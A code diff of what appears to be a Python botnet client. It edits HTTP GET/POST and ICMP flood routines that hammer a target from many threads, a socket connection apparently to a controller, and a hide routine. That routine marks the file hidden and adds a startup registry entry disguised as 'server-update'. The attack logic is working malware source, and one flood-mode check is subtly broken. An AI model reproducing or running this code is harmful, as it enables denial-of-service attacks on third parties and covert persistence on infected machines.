@@ -15,11 +15,11 @@ s = socket(AF_INET, SOCK_STREAM) # create socket
 ddos_flag = False # used to control ddos attack thread
 path = abspath(argv[0]) # used in .exe mode
 
-def ddos(mode:str, ip:str): #ip : ip or url
+def ddos(mode:str, address:str): #address : ip or url
     '''
     This method is the main attack method
     mode is ta supported attack method 
-    THE IP CAN BE A IP OR A URL
+    THE ADDRESS CAN BE A IP OR A URL
     each method will define a method "attack", which will be execute countless times by thread and infinite loop
     the "attack" method require a ip or url
     '''
@@ -32,16 +32,16 @@ def ddos(mode:str, ip:str): #ip : ip or url
         } # can be changed
         context = _create_unverified_context()
         data = bytes(parse.urlencode(dict), encoding='utf8')
-        def attack(ip):
+        def attack(url):
             global ddos_flag
             while True:
                 if ddos_flag: return
                 try:
                     if mode == 'httpGETflood' or 'httpflood': # GETflood for default
-                        with request.urlopen(ip, context=context)as response:
+                        with request.urlopen(url, context=context)as response:
                             print('[*]code:', response.status)
                     elif mode == 'httpPOSTflood':
-                        with request.urlopen(ip, data=data, context=context) as response:
+                        with request.urlopen(url, data=data, context=context) as response:
                             print('[*]code:', response.status)
                 except Exception as e:
                     print(e)
@@ -84,8 +84,8 @@ def ddos(mode:str, ip:str): #ip : ip or url
                 Sock.sendto(icmp_data , (ip, 0))
                 recv_packet, addr = Sock.recvfrom(1024)
                 print('[*]ttl: ' + unpack("!BBHHHBBHII", recv_packet[:20])[5])
-    print('[*]Attack:', ip)
-    for i in range(Threads): Thread(target=attack, args=(ip,)).start()
+    print('[*]Attack:', address)
+    for i in range(Threads): Thread(target=attack, args=(address,)).start()
 def connect():
     global s
     try:
@@ -120,15 +120,16 @@ def hide():
         win32api.SetFileAttributes(path,win32con.FILE_ATTRIBUTE_HIDDEN) 
         print("[*]File hidden") 
     if Self_starting:
+        import winreg
         print('[*]Installing to "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"')
-        reg_root = win32con.HKEY_CURRENT_USER
+        reg_root = winreg.HKEY_CURRENT_USER
         reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
-        key = win32api.RegOpenKey(reg_root, reg_path, 0, win32con.KEY_ALL_ACCESS)
+        key = winreg.OpenKey(reg_root, reg_path, 0, winreg.KEY_ALL_ACCESS)
         if mode == 'py':
-            win32api.RegSetValueEx(key, "server-update", 0, win32con.REG_SZ, path)
+            winreg.SetValueEx(key, "server-update", 0, winreg.REG_SZ, 'python' + path)
         if mode == 'exe':
-            win32api.RegSetValueEx(key, "server-update", 0, win32con.REG_SZ, 'python' + path)
-        win32api.RegCloseKey(key)
+            winreg.SetValueEx(key, "server-update", 0, winreg.REG_SZ, path)
+        winreg.CloseKey(key)
         print("[+]Installed")
 if __name__ == '__main__':
     print("[*]start")
